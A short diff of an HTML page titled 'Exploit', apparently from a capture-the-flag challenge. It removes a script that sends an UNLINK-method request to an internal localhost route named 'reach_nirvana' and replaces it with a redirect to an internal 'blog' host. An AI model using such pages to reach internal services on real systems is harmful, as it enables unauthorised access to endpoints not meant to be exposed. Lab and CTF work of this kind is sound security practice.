@@ -1,14 +1,8 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Exploit</title>
-</head>
 <body>
     <script>
-        // Mencoba menembak menggunakan rute metode UNLINK ke target internal
-        fetch('http://127.0.0.1:3000/reach_nirvana', {
-            method: 'UNLINK'
-        }).catch(err => console.log(err));
+        window.location.href = "http://blog:4000";
     </script>
 </body>
 </html>
